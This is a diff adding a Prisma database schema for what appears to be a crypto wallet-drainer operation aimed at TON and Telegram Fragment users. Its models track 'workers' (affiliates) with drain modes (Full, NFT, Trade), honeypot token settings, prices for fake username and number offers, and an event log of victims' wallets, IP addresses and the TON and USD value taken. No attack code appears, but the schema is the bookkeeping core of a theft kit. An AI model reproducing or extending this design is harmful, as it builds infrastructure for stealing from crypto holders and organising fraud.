@@ -1,0 +1,106 @@
+// This is your Prisma schema file,
+// learn more about it in the docs: https://pris.ly/d/prisma-schema
+
+// Looking for ways to speed up your queries, or scale easily with your serverless or edge functions?
+// Try Prisma Accelerate: https://pris.ly/cli/accelerate-init
+
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model Worker {
+  id     Int     @id @default(autoincrement())
+  tgId   BigInt  @unique @map("telegram_id")
+  tgUser String? @map("telegram_username")
+
+  drainMode    DrainMode    @default(NFT) @map("drain_mode")
+  fragmentMode FragmentMode @default(Auction) @map("fragment_mode")
+  honeyPot     Boolean      @default(false) @map("honey_pot")
+  honeyPotMode HoneyPotMode @default(tsTON) @map("honey_pot_mode")
+  numberPrice  Int          @default(130) @map("number_price")
+  userPrice    Int          @default(10) @map("username_price")
+  logChat      String?      @map("logging_chat")
+
+  accounts Account[]
+  offers   Offer[]
+
+  @@map("workers")
+}
+
+model Account {
+  id       Int     @id @default(autoincrement())
+  tgId     BigInt  @unique @map("telegram_id")
+  tgUser   String? @map("telegram_username")
+  approved Boolean @default(false)
+
+  workerId Int?
+  worker   Worker? @relation(fields: [workerId], references: [id])
+
+  @@map("accounts")
+}
+
+model Rate {
+  id        Int      @id @default(autoincrement())
+  currency  String   @unique
+  rate      Float
+  updatedAt DateTime @updatedAt @map("updated_at")
+
+  @@map("rates")
+}
+
+model Offer {
+  id        Int       @id @default(autoincrement())
+  item      String
+  amount    Int
+  type      ItemType
+  mode      DrainMode
+  createdAt DateTime  @default(now()) @map("created_at")
+
+  workerId Int?
+  worker   Worker? @relation(fields: [workerId], references: [id])
+}
+
+enum ItemType {
+  Username
+  Number
+}
+
+enum DrainMode {
+  Full
+  NFT
+  Trade
+}
+
+enum FragmentMode {
+  Auction
+  Sale
+}
+
+enum HoneyPotMode {
+  USDT
+  tsTON
+}
+
+model Event {
+  id        Int      @id @default(autoincrement())
+  kind      String
+  wallet    String?
+  workerId  Int?     @map("worker_id")
+  item      String?
+  amount    Int?
+  mode      String?
+  tonValue  Float    @default(0) @map("ton_value")
+  usdValue  Float    @default(0) @map("usd_value")
+  ip        String?
+  reason    String?
+  createdAt DateTime @default(now()) @map("created_at")
+
+  @@index([kind, createdAt])
+  @@index([createdAt])
+  @@map("events")
+}
